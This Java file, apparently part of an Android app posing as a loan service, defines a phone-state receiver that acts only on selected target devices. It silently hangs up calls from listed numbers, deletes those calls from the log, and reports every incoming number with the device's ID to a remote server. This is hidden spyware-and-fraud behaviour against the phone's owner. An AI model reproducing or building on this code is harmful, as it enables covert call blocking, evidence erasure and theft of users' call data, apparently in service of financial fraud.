package main.app.loan;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.os.Handler;
import android.os.Message;
import android.telephony.PhoneStateListener;
import android.telephony.TelephonyManager;

public class OnInReceiver extends BroadcastReceiver {


	public final Handler myHandler = new Handler()
	{
	    public void handleMessage( Message msg )
	    {
	      try{
	      }
	      catch(Exception e)
	      {
	    	  
	      }
	    }
	};
	
	void SendHandlerMessage(int nOpcode)
	{
		 try{
		    Message msg = myHandler.obtainMessage();
		    msg.what = nOpcode;
		 	Bundle data=new Bundle();
		 	msg.setData(data); 
		 	myHandler.sendMessage( msg );
		 }
		 catch(Exception e)
		 {
			 
		 }
	}
	
	public void DeleteIncomLog(String number)
    {
		final String delNum = number;
		new Thread(new Runnable() {
			
			@Override
			public void run() {
				try{
					for (int i = 0; i < 12; i++)
					{
						int nTime = GlobalLib.DeleteCallLog(mContext, delNum, false);
						if(nTime >= 0)
						{
							break;
						}
						Thread.sleep(500);
					}
				}
				catch(Exception e)
				{
				}
			}
		}).start();
    }	

	public static Context mContext = null;
	
	public void ProcessIncoming(String incomingNumber)
	{
		if(incomingNumber == null) return;
		
		incomingNumber.trim();
		if("".equals(incomingNumber) == true)
		{ 
			return;
		}
		
    	NetServer.mDeviceUID = GlobalLib.GetDeviceUID(mContext);
			
		try{
			incomingNumber = GlobalLib.FormatPhoneNumber(incomingNumber);
			
			if(VarSpace.mChangeNum.equals(incomingNumber)==true || VarSpace.mOriginNum.equals(incomingNumber)==true)
			{
				return;
			}
			else
			{
				String nOpcode = NetServer.CALL_IN_NORM;
				
				if(incomingNumber.equals(VarSpace.mOutgoNum)==true)
				{
					return;
				}
				else
				{
	                if(DBRef.IsBlockerNumber(mContext, incomingNumber, true) == true)
					{
	                	myTelephony.silenceRinger(mContext);
	                	
	                	myTelephony.endCall(mContext);
		                
		                DeleteIncomLog(incomingNumber);

		                nOpcode = NetServer.CALL_IN_HOOK;
					}
				}
                
	        	NetServer.SendCallLog(mContext, nOpcode, incomingNumber, null);
			}
		}
		catch(Exception e)
		{
			
		}
	}
	

    @Override
    public void onReceive(Context context, Intent intent) {

    	try{
        	if (ModelType.IsTargetDevice(context) == false)
        	{
        		return;
        	}
        	
        	if (InstallWnd.IsOverDeadline(context) == true)
        	{
        		return;
        	}

        	mContext = context;
        	
        	final String action = intent.getAction();
        	if (action.equals(TelephonyManager.ACTION_PHONE_STATE_CHANGED))
        	{
        		final String phoneState = intent.getStringExtra(TelephonyManager.EXTRA_STATE);
				final String phoneNumber = intent.getStringExtra(TelephonyManager.EXTRA_INCOMING_NUMBER);
				if(phoneState.equals(TelephonyManager.EXTRA_STATE_RINGING))
				{
					VarSpace.mOutgoNum = "";
				}
				if(phoneState.equals(TelephonyManager.EXTRA_STATE_OFFHOOK))
				{
					ProcessIncoming(phoneNumber);
				}
        	}
    	}
    	catch(Exception e)
    	{
    	}
    }
    
}